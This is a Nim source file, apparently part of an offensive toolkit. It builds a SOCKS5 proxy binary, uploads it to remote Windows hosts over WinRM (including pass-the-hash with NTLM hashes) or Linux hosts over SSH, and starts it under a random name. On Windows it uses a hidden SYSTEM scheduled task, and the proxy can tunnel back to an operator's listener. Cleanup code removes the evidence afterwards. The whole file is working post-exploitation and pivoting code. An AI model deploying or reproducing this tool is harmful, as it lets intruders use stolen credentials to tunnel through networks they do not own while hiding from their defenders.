import std/[strutils, os, osproc, random, times, net, base64, asyncdispatch]

import ../winrm/client as winrm
import ../ssh/client as sshclient
import svc/socksctrl as socksctrl

const socksSource = staticRead("svc/nimuxsocks.nim")

const crossFlags = " -d:mingw --cpu:amd64 --os:windows --threads:on --tlsEmulation:off -d:release --opt:size" &
                   " --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc" &
                   " --gcc.linkerexe:x86_64-w64-mingw32-gcc --passL:-static" &
                   " --mm:arc"

const linuxFlags = " --os:linux --threads:on --tlsEmulation:off -d:release --opt:size --mm:arc"

type
  SocksDeployResult* = object
    host*: string
    port*: int
    socksPort*: int
    success*: bool
    message*: string
    remotePath*: string
    pid*: string
    taskName*: string

proc randomToken(): string =
  var rng = initRand(int(getTime().toUnix()) xor cast[int](addr result))
  for _ in 0 ..< 10:
    let c = rng.rand(35)
    if c < 10: result.add chr(ord('0') + c)
    else: result.add chr(ord('a') + (c - 10))

proc shQuote(s: string): string =
  "'" & s.replace("'", "'\"'\"'") & "'"

proc binaryTargetName(linuxBackend: bool): string =
  if linuxBackend: "nimuxsocks"
  else: "nimuxsocks.exe"

proc helperRemoteName(token: string; linuxBackend: bool): string =
  if linuxBackend: "nimproxy" & token
  else: "nimproxy" & token & ".exe"

proc buildSocksProxyBinary*(linuxBackend = false): string =
  let tmp = getTempDir() / "nimuxsocks_build_" & $getCurrentProcessId()
  createDir(tmp)
  try:
    writeFile(tmp / "nimuxsocks.nim", socksSource)
    let exe = tmp / binaryTargetName(linuxBackend)
    let buildFlags = if linuxBackend: linuxFlags else: crossFlags
    let cmd = "nim --skipParentCfg:on c" & buildFlags & " --app:console" &
              " --threads:on" &
              " --nimcache:" & tmp / "cache" &
              " -o:" & exe & " " & tmp / "nimuxsocks.nim"
    let (output, code) = execCmdEx(cmd)
    if code != 0:
      raise newException(IOError, "socks compile failed:\n" & output)
    result = readFile(exe)
  finally:
    removeDir(tmp)

proc runLinuxSsh(username, password, sshKeyPath, host: string; port, timeoutMs: int;
                 remoteCommand: string): tuple[ok: bool; output: string; message: string] =
  if username.len == 0:
    return (false, "", "Linux deployment requires --username")
  let r =
    if sshKeyPath.len > 0:
      waitFor sshclient.sshExecKey(host, port, timeoutMs, username, sshKeyPath, remoteCommand)
    else:
      if password.len == 0:
        return (false, "", "Linux deployment requires --password or --ssh-key")
      waitFor sshclient.sshExec(host, port, timeoutMs, username, password, remoteCommand)
  if not r.reachable:
    return (false, r.output, "ssh connection failed")
  if not r.authenticated:
    return (false, r.output, if r.authMessage.len > 0: r.authMessage else: "ssh authentication failed")
  if r.exitCode != 0:
    let msg = if r.stderrOut.strip().len > 0: r.stderrOut.strip()
              elif r.output.strip().len > 0: r.output.strip()
              else: "remote command failed"
    return (false, r.output, msg)
  (true, r.output, "")

proc runLinuxUpload(username, password, sshKeyPath, host: string; port, timeoutMs: int;
                    remotePath: string; data: string): tuple[ok: bool; message: string] =
  if username.len == 0:
    return (false, "Linux deployment requires --username")
  let payload = encode(data)
  let command = "umask 077; base64 -d > " & shQuote(remotePath)
  let r =
    if sshKeyPath.len > 0:
      waitFor sshclient.sshExecInputKey(host, port, timeoutMs, username, sshKeyPath, command, payload)
    else:
      if password.len == 0:
        return (false, "Linux deployment requires --password or --ssh-key")
      waitFor sshclient.sshExecInput(host, port, timeoutMs, username, password, command, payload)
  if not r.reachable:
    return (false, "ssh connection failed")
  if not r.authenticated:
    return (false, if r.authMessage.len > 0: r.authMessage else: "ssh authentication failed")
  if r.exitCode != 0:
    return (false,
      if r.stderrOut.strip().len > 0: r.stderrOut.strip()
      elif r.output.strip().len > 0: r.output.strip()
      else: "remote upload failed")
  (true, "")

proc deploySocksProxy*(
  host: string; port, timeoutMs, socksPort: int;
  username, password, ntlmHash, domain: string;
  socksAuth = "";
  bindAddr = "0.0.0.0";
  useSsl = false;
  kerberos = false;
  userProcess = false;
  reverseHost = "";
  reversePort = 0;
  linuxBackend = false;
  sshKeyPath = "";
  remotePathOverride = ""
): SocksDeployResult =
  result.host = host
  result.port = port
  result.socksPort = socksPort

  var exeBytes: string
  try:
    exeBytes = buildSocksProxyBinary(linuxBackend)
  except CatchableError as e:
    result.message = "compile failed: " & e.msg.splitLines()[0]
    return

  let token = randomToken()
  let remoteName = helperRemoteName(token, linuxBackend)

  if linuxBackend:
    if not kerberos and username.len == 0:
      result.message = "Linux deployment requires --username"
      return
    if reverseHost.len == 0 or reversePort <= 0:
      result.message = "Linux deployment currently requires --reverse and --listener"
      return

    result.remotePath =
      if remotePathOverride.len > 0: remotePathOverride
      else: "/tmp/" & remoteName

    let upload = runLinuxUpload(username, password, sshKeyPath, host, port, timeoutMs,
      result.remotePath, exeBytes)
    if not upload.ok:
      result.message = "upload failed: " & upload.message
      return

    let verify = runLinuxSsh(username, password, sshKeyPath, host, port, timeoutMs,
      "test -f " & shQuote(result.remotePath) & " && echo found || echo missing")
    let verifyOut = verify.output.strip()
    if not verify.ok or verifyOut != "found":
      result.message = "uploaded file not found at " & result.remotePath &
        (if verifyOut.len > 0: " (got: " & verifyOut & ")" else: "")
      return

    discard runLinuxSsh(username, password, sshKeyPath, host, port, timeoutMs,
      "chmod +x " & shQuote(result.remotePath) & " ; pkill -f '[n]improxy' >/dev/null 2>&1 || true")

    let args = "--reverse " & reverseHost & " --reverse-port " & $reversePort
    let start = runLinuxSsh(username, password, sshKeyPath, host, port, timeoutMs,
      "nohup " & shQuote(result.remotePath) & " " & args &
      " >/dev/null 2>&1 & echo $!")
    let startOut = start.output.strip()
    if not start.ok or startOut.len == 0:
      result.message = "start failed" &
        (if startOut.len > 0: ": " & startOut else: "")
      return

    result.pid = startOut
    result.taskName = ""
    result.success = true
    result.message = "socks5 proxy running via ssh"
    return

  let authMethod = if kerberos: winrm.wamKerberos else: winrm.wamNtlm

  let getTemp = winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    "[System.IO.Path]::GetTempPath().TrimEnd('\\')", useSsl, authMethod,
    forcePsrp = true)
  if not getTemp.success:
    result.message = "WinRM auth failed: " & getTemp.message
    return
  let tempDir = getTemp.output.strip().replace("\r", "").replace("\n", "")
  if tempDir.len == 0:
    result.message = "could not get remote TEMP path"
    return
  result.remotePath = tempDir & "\\" & remoteName

  let localExe = getTempDir() / ("nimproxy_upload_" & token & ".exe")
  try:
    writeFile(localExe, exeBytes)
    let upload = winrm.winRmUploadFile(host, port, username, password, ntlmHash, domain,
      localExe, result.remotePath, useSsl, authMethod)
    if not upload.success:
      result.message = "upload failed: " & upload.message
      return
  finally:
    try: removeFile(localExe) except CatchableError: discard

  let testPs = "if(Test-Path '" & result.remotePath & "'){'found'}else{'missing'}"
  let testResult = winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    testPs, useSsl, authMethod, forcePsrp = true)
  let testOut = testResult.output.strip().replace("\r", "").replace("\n", "")
  if testOut != "found":
    result.message = "uploaded file not found at " & result.remotePath & " (got: " & testOut & ")"
    return

  var effectiveReverseHost = reverseHost
  if effectiveReverseHost.len == 0 and reversePort > 0:
    try:
      let s = newSocket()
      s.connect(host, Port(port))
      let localAddr = s.getLocalAddr()
      effectiveReverseHost = localAddr[0]
      s.close()
    except CatchableError: discard

  var args =
    if effectiveReverseHost.len > 0 and reversePort > 0:
      "--reverse " & effectiveReverseHost & " --reverse-port " & $reversePort
    else:
      "--bind " & bindAddr & " --port " & $socksPort
  if socksAuth.len > 0:
    args.add " --auth " & socksAuth
  let taskName = "nimproxy" & token

  discard winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    "Get-Process -Name nimproxy* -EA 0|Stop-Process -Force -EA 0;" &
    "Get-ScheduledTask -TaskPath '\\' -EA 0|" &
    "Where-Object{$_.TaskName -like 'nimproxy*'}|" &
    "ForEach-Object{Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -EA 0};" &
    "'cleaned'",
    useSsl, authMethod, forcePsrp = true)
  let exeBase = remoteName[0 ..< remoteName.len - 4]
  let userSpec = if domain.len > 0: domain & "\\" & username else: username
  let processStartPs = "try{" &
    "$p=Start-Process -FilePath '" & result.remotePath & "' -ArgumentList '" & args & "' -WindowStyle Hidden -PassThru;" &
    "Start-Sleep -Seconds 2;" &
    "('process:'+$p.Id)" &
    "}catch{'err:'+$_.Exception.Message}"
  let taskStartPs = "try{" &
    "$mode='task';$pidOut='';" &
    "$ts=New-Object -ComObject Schedule.Service;$ts.Connect();" &
    "$f=$ts.GetFolder('\\');$td=$ts.NewTask(0);" &
    "$td.Settings.Hidden=$true;$td.Settings.ExecutionTimeLimit='PT0S';" &
    "$td.Settings.StartWhenAvailable=$true;" &
    "$a=$td.Actions.Create(0);" &
    "$a.Path='" & result.remotePath & "';" &
    "$a.Arguments='" & args & "';" &
    "try{$null=$f.RegisterTaskDefinition('" & taskName & "',$td,6,'SYSTEM',$null,5,$null)}" &
    "catch{$null=$f.RegisterTaskDefinition('" & taskName & "',$td,6,'" & userSpec & "',$null,2,$null)};" &
    "$f.GetTask('" & taskName & "').Run($null)|Out-Null;" &
    "Start-Sleep -Seconds 3;" &
    "$pidOut=(Get-Process -Name " & exeBase & " -EA 0|Select-Object -First 1).Id;" &
    "if(-not $pidOut){throw 'task started but process not found'};" &
    "($mode+':'+$pidOut)" &
    "}catch{" &
    processStartPs &
    "}"
  let startPs = if userProcess: processStartPs else: taskStartPs
  let startResult = winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    startPs, useSsl, authMethod, forcePsrp = true)
  if not startResult.success:
    result.message = "start failed: " & startResult.message
    return
  let startOut = startResult.output.strip().replace("\r", "").replace("\n", "")
  if startOut.startsWith("err:"):
    result.message = "start error: " & startOut
    return
  if startOut.startsWith("task:"):
    result.pid = startOut["task:".len .. ^1]
    result.taskName = taskName
  elif startOut.startsWith("process:"):
    result.pid = startOut["process:".len .. ^1]
    result.taskName = ""
  else:
    result.pid = startOut
    result.taskName = taskName
  result.success = true
  result.message =
    if result.taskName.len > 0: "socks5 proxy running via scheduled task"
    else: "socks5 proxy running in user context"

proc runReverseSocksController*(socksBind: string; socksPort, controlPort: int) =
  {.cast(gcsafe).}:
    socksctrl.runSocksServer(socksctrl.SocksServerArgs(
      bindAddr: socksBind,
      socksPort: socksPort,
      ctrlPort: controlPort))

proc killSocksProxy*(
  host: string; port, timeoutMs: int;
  username, password, ntlmHash, domain: string;
  remotePath, pid, taskName: string;
  useSsl = false;
  kerberos = false;
  linuxBackend = false;
  sshKeyPath = ""
): tuple[ok: bool; message: string] =
  if linuxBackend:
    let marker = "__nimux_cleanup_ok__"
    let helperName = if remotePath.len > 0: extractFilename(remotePath) else: ""
    var cmd = ""
    if pid.len > 0:
      cmd.add "kill -9 " & shQuote(pid) & " >/dev/null 2>&1 || true"
    elif helperName.len > 0:
      cmd.add "pkill -x " & shQuote(helperName) & " >/dev/null 2>&1 || true"
    else:
      cmd.add "pkill -f '[n]improxy' >/dev/null 2>&1 || true"
    if remotePath.len > 0:
      cmd.add "; rm -f " & shQuote(remotePath) & " >/dev/null 2>&1 || true"
    cmd.add "; printf " & shQuote(marker)

    let r =
      if sshKeyPath.len > 0:
        waitFor sshclient.sshExecKey(host, port, timeoutMs, username, sshKeyPath, cmd)
      else:
        if password.len == 0:
          return (false, "Linux deployment requires --password or --ssh-key")
        waitFor sshclient.sshExec(host, port, timeoutMs, username, password, cmd)

    if not r.reachable:
      return (false, "ssh connection failed")
    if not r.authenticated:
      return (false, if r.authMessage.len > 0: r.authMessage else: "ssh authentication failed")
    if marker in r.output:
      return (true, "proxy stopped and removed")
    return (false, if r.stderrOut.strip().len > 0: r.stderrOut.strip()
                   elif r.output.strip().len > 0: r.output.strip()
                   elif r.authMessage.len > 0: r.authMessage
                   else: "ssh cleanup failed")

  let authMethod = if kerberos: winrm.wamKerberos else: winrm.wamNtlm
  var ps = ""
  if pid.len > 0:
    ps.add "try{Stop-Process -Id " & pid & " -Force -ErrorAction SilentlyContinue}catch{}"
  if ps.len > 0: ps.add ";"
  ps.add "Stop-Process -Name nimproxy* -Force -ErrorAction SilentlyContinue"
  if taskName.len > 0:
    ps.add ";try{$ts=New-Object -ComObject Schedule.Service;$ts.Connect();" &
      "$ts.GetFolder('\\').DeleteTask('" & taskName & "',0)}catch{}"
  if remotePath.len > 0:
    ps.add ";Start-Sleep -Milliseconds 500;Remove-Item '" & remotePath & "' -Force -ErrorAction SilentlyContinue"
  let r = winrm.runWinRmCommand(host, port, username, password, ntlmHash, domain,
    ps, useSsl, authMethod, forcePsrp = true)
  if r.success:
    result = (true, "proxy stopped and removed")
  else:
    result = (false, r.message)
